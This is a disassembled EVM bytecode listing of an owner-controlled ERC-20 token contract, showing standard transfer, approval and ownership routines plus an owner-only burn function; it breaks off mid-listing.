JUMP JUMPDEST SWAP6 POP DUP1 NOT DUP5 AND SWAP4 POP DUP1 DUP7 AND DUP5 OR SWAP3 POP POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x99D PUSH3 0x997 PUSH3 0x991 DUP5 PUSH3 0x765 JUMP JUMPDEST PUSH3 0x972 JUMP JUMPDEST PUSH3 0x765 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x9B9 DUP4 PUSH3 0x97C JUMP JUMPDEST PUSH3 0x9D1 PUSH3 0x9C8 DUP3 PUSH3 0x9A4 JUMP JUMPDEST DUP5 DUP5 SLOAD PUSH3 0x91C JUMP JUMPDEST DUP3 SSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SWAP1 JUMP JUMPDEST PUSH3 0x9E8 PUSH3 0x9D9 JUMP JUMPDEST PUSH3 0x9F5 DUP2 DUP5 DUP5 PUSH3 0x9AE JUMP JUMPDEST POP POP POP JUMP JUMPDEST JUMPDEST DUP2 DUP2 LT ISZERO PUSH3 0xA1D JUMPI PUSH3 0xA11 PUSH1 0x0 DUP3 PUSH3 0x9DE JUMP JUMPDEST PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH3 0x9FB JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH3 0xA6C JUMPI PUSH3 0xA36 DUP2 PUSH3 0x8EA JUMP JUMPDEST PUSH3 0xA41 DUP5 PUSH3 0x8FF JUMP JUMPDEST DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH3 0xA51 JUMPI DUP2 SWAP1 POP JUMPDEST PUSH3 0xA69 PUSH3 0xA60 DUP6 PUSH3 0x8FF JUMP JUMPDEST DUP4 ADD DUP3 PUSH3 0x9FA JUMP JUMPDEST POP POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 SHR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xA91 PUSH1 0x0 NOT DUP5 PUSH1 0x8 MUL PUSH3 0xA71 JUMP JUMPDEST NOT DUP1 DUP4 AND SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xAAC DUP4 DUP4 PUSH3 0xA7E JUMP JUMPDEST SWAP2 POP DUP3 PUSH1 0x2 MUL DUP3 OR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH3 0xAC7 DUP3 PUSH3 0x84C JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0xAE3 JUMPI PUSH3 0xAE2 PUSH3 0x857 JUMP JUMPDEST JUMPDEST PUSH3 0xAEF DUP3 SLOAD PUSH3 0x8B5 JUMP JUMPDEST PUSH3 0xAFC DUP3 DUP3 DUP6 PUSH3 0xA21 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 SWAP1 POP PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH3 0xB34 JUMPI PUSH1 0x0 DUP5 ISZERO PUSH3 0xB1F JUMPI DUP3 DUP8 ADD MLOAD SWAP1 POP JUMPDEST PUSH3 0xB2B DUP6 DUP3 PUSH3 0xA9E JUMP JUMPDEST DUP7 SSTORE POP PUSH3 0xB9B JUMP JUMPDEST PUSH1 0x1F NOT DUP5 AND PUSH3 0xB44 DUP7 PUSH3 0x8EA JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP3 DUP2 LT ISZERO PUSH3 0xB6E JUMPI DUP5 DUP10 ADD MLOAD DUP3 SSTORE PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP6 ADD SWAP5 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xB47 JUMP JUMPDEST DUP7 DUP4 LT ISZERO PUSH3 0xB8E JUMPI DUP5 DUP10 ADD MLOAD PUSH3 0xB8A PUSH1 0x1F DUP10 AND DUP3 PUSH3 0xA7E JUMP JUMPDEST DUP4 SSTORE POP JUMPDEST PUSH1 0x1 PUSH1 0x2 DUP9 MUL ADD DUP9 SSTORE POP POP POP JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH3 0xBAE DUP2 PUSH3 0x7C0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0xBCB PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0xBA3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0xC0D DUP3 PUSH3 0x765 JUMP JUMPDEST SWAP2 POP PUSH3 0xC1A DUP4 PUSH3 0x765 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH3 0xC2A DUP2 PUSH3 0x765 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH3 0xC44 JUMPI PUSH3 0xC43 PUSH3 0xBD1 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xC58 DUP3 PUSH3 0x765 JUMP JUMPDEST SWAP2 POP PUSH3 0xC65 DUP4 PUSH3 0x765 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH3 0xC80 JUMPI PUSH3 0xC7F PUSH3 0xBD1 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH3 0xC91 DUP2 PUSH3 0x765 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH3 0xCAE PUSH1 0x0 DUP4 ADD DUP7 PUSH3 0xBA3 JUMP JUMPDEST PUSH3 0xCBD PUSH1 0x20 DUP4 ADD DUP6 PUSH3 0xC86 JUMP JUMPDEST PUSH3 0xCCC PUSH1 0x40 DUP4 ADD DUP5 PUSH3 0xC86 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0xCEB PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0xC86 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x11EF DUP1 PUSH3 0xD01 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xCF JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x715018A6 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x9DC29FAC GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x9DC29FAC EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x220 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x280 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x715018A6 EQ PUSH2 0x1BE JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1C8 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x1E6 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xD4 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0xF2 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x122 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x140 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x170 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x18E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xDC PUSH2 0x29C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xE9 SWAP2 SWAP1 PUSH2 0xE01 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x10C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x107 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x32E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x119 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x12A PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x137 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x15A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x155 SWAP2 SWAP1 PUSH2 0xF5C JUMP JUMPDEST PUSH2 0x35B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x167 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x178 PUSH2 0x38A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x185 SWAP2 SWAP1 PUSH2 0xFCB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1A8 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1A3 SWAP2 SWAP1 PUSH2 0xFE6 JUMP JUMPDEST PUSH2 0x393 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1B5 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1C6 PUSH2 0x3DB JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1D0 PUSH2 0x3EF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1DD SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1EE PUSH2 0x419 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1FB SWAP2 SWAP1 PUSH2 0xE01 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x21E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x219 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x4AB JUMP JUMPDEST STOP JUMPDEST PUSH2 0x23A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x235 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x4D4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x247 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x26A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x265 SWAP2 SWAP1 PUSH2 0x103D JUMP JUMPDEST PUSH2 0x4F7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x277 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x29A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x295 SWAP2 SWAP1 PUSH2 0xFE6 JUMP JUMPDEST PUSH2 0x57E JUMP JUMPDEST STOP JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH2 0x2AB SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x2D7 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 ISZERO PUSH2 0x324 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2F9 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x324 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x307 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x339 PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x346 DUP2 DUP6 DUP6 PUSH2 0x60C JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x366 PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x373 DUP6 DUP3 DUP6 PUSH2 0x61E JUMP JUMPDEST PUSH2 0x37E DUP6 DUP6 DUP6 PUSH2 0x6B2 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x12 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3E3 PUSH2 0x7A6 JUMP JUMPDEST PUSH2 0x3ED PUSH1 0x0 PUSH2 0x82D JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH2 0x428 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x454 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 ISZERO PUSH2 0x4A1 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x476 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x4A1 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x484 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x4B3 PUSH2 0x7A6 JUMP JUMPDEST PUSH2 0x4D0 DUP3 PUSH8 0xDE0B6B3A7640000 DUP4 PUSH2 0x4CB SWAP2 SWAP1 PUSH2 0x110C JUMP JUMPDEST PUSH2 0x8F3 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x4DF PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x4EC DUP2 DUP6 DUP6 PUSH2 0x6B2 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x586 PUSH2 0x7A6 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x5F8 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x1E4FBDF700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5EF SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x601 DUP2 PUSH2 0x82D JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x619 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x975 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x62A DUP5 DUP5 PUSH2 0x4F7 JUMP JUMPDEST SWAP1 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 EQ PUSH2 0x6AC JUMPI DUP2 DUP2 LT ISZERO PUSH2 0x69C JUMPI DUP3 DUP2 DUP4 PUSH1 0x40 MLOAD PUSH32 0xFB8F41B200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x693 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x114E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x6AB DUP5 DUP5 DUP5 DUP5 SUB PUSH1 0x0 PUSH2 0x975 JUMP JUMPDEST JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x724 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x96C6FD1E00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x71B SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x796 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xEC442F0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x78D SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x7A1 DUP4 DUP4 DUP4 PUSH2 0xB4C JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x7AE PUSH2 0x604 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x7CC PUSH2 0x3EF JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x82B JUMPI PUSH2 0x7EF PUSH2 0x604 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH32 0x118CDAA700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x822 SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x965 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x96C6FD1E00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x95C SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x971 DUP3 PUSH1 0x0 DUP4 PUSH2 0xB4C JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x9E7 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xE602DF0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x9DE SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xA59 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x94280D6200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xA50 SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 PUSH1 0x1 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP1 ISZERO PUSH2 0xB46 JUMPI DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP5 PUSH1 0x40 MLOAD PUSH2 0xB3D SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xB9E JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0xB92 SWAP2 SWAP1 PUSH2 0x1185 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0xC71 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP DUP2 DUP2 LT ISZERO PUSH2 0xC2A JUMPI DUP4 DUP2 DUP4 PUSH1 0x40 MLOAD PUSH32 0xE450D38C00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC21 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x114E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 DUP2 SUB PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xCBA JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0xD07 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 